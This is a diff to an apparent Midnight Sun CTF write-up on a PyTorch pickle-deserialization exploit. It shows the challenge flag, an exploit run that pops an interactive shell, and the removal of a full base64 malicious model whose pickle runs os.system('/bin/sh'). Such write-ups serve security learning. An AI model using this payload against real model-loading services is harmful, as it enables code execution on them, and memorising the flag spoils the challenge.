@@ -8,7 +8,7 @@ Description:
 >
 > flag: midnight{backd00r5_ar3_c00l_wh3n_th3Y_ar3_yoUR5}
 
-**Tags:** Python, PyTorch, Pickle Deserialization
+**Tags:** Python, PyTorch, Pickle Deserialization, Midnight Sun CTF
 
 ## Takeaways
 
@@ -103,9 +103,9 @@ $ cat flag
 midnight{backd00r5_ar3_c00l_wh3n_th3Y_ar3_yoUR5}
 ```
 
-## Reproduce
+## Final Exploit
 `exploit.py` uses pwntools to automate the exploit both locally and remotely. Assuming you have all the required packages you can test the exploit locally with:
-```console
+```bash
 $ python3 exploit.py LOCAL
 
 [*] Exporting malicious model. Code to be executed:
@@ -122,7 +122,7 @@ $ python3 exploit.py LOCAL
 88 8  8 88ee 88 8  8 88ee 88eee8 8eee8 88  8   88  88   8 8eee8 88eee 
 
 Send the base64 encoded model: 
-[*] Pushing payload: UEsDBAAACAgAAAAAAAAAAAAAAAAAAAAAAAAUAA4AbWVtZWNvbnRyb2wvZGF0YS5wa2xGQgoAWlpaWlpaWlpaWoACY19fYnVpbHRpbl9fCmV4ZWMKcQBYVwAAAAppbXBvcnQgb3MKcHJpbnQoIkhlbGxvIGZyb20gdGhlIG90aGVyIHNpZGUhIFBvcHBpbmcgYSBzaGVsbC4uLiIpCm9zLnN5c3RlbSgnL2Jpbi9zaCcpCnEBhXECUnEDKFgBAAAAWnEEWAEAAABUcQVYAQAAADBxBmgFdS5QSwcIjN1j75cAAACXAAAAUEsDBAAACAgAAAAAAAAAAAAAAAAAAAAAAAATACgAbWVtZWNvbnRyb2wvdmVyc2lvbkZCJABaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlozClBLBwjRnmdVAgAAAAIAAABQSwECAAAAAAgIAAAAAAAAjN1j75cAAACXAAAAFAAAAAAAAAAAAAAAAAAAAAAAbWVtZWNvbnRyb2wvZGF0YS5wa2xQSwECAAAAAAgIAAAAAAAA0Z5nVQIAAAACAAAAEwAAAAAAAAAAAAAAAADnAAAAbWVtZWNvbnRyb2wvdmVyc2lvblBLBgYsAAAAAAAAAB4DLQAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAACDAAAAAAAAAFIBAAAAAAAAUEsGBwAAAADVAQAAAAAAAAEAAABQSwUGAAAAAAIAAgCDAAAAUgEAAAAA
+[*] Pushing payload: UEsDBAAACAgAAAAAAAAAAAAAAAAAAAAA...
 [+] Evaluating the model ...
     Hello from the other side! Popping a shell...
 [*] Switching to interactive mode
